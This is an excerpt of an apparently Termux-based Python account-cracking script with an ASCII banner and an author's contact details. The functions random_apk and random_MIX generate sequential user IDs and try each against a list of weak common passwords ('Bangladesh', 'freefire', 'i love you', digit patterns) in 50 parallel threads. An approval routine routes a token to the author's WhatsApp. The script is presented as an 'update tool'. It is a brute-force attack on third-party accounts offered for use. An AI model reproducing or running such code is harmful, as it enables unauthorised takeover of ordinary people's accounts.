...
print('\n\033[1;37m install modules....\n It will take some seconds...munshiganj    W8 update Tool..')
...
\033[1;37m      ,ad8888ba,   88b           d88  888b      88  
\033[1;92m     d8"'    `"8b  888b         d888  8888b     88  
\033[1;37m    d8'            88`8b       d8'88  88 `8b    88  
\033[1;37m    88             88 `8b     d8' 88  88  `8b   88  
\033[1;92m    88             88  `8b   d8'  88  88   `8b  88  
\033[1;37m    Y8,            88   `8b d8'   88  88    `8b 88  
\033[1;92m     Y8a.    .a8P  88    `888'    88  88     `8888  
\033[1;37m      `"Y8888Y"'   88     `8'     88  88      `888                                                                                                                                                                                                                               
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m 
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : SHAHID HASAN          │ 
\033[1;37m│ ❲★❳ GITHUB   : SHAHID HASAN             |
\033[1;37m│ ❲★❳ WHATSAPP : +88 01995407289        │
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','freefire','free fire','nusrat@@','sadiy123','akash@#','@pubg123','gamer@@','@@1020##','i love you','বাংলাদেশ']
...
def random_MIX():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','freefire','free fire','nusrat','i love you','বাংলাদেশ']
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801995407289?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
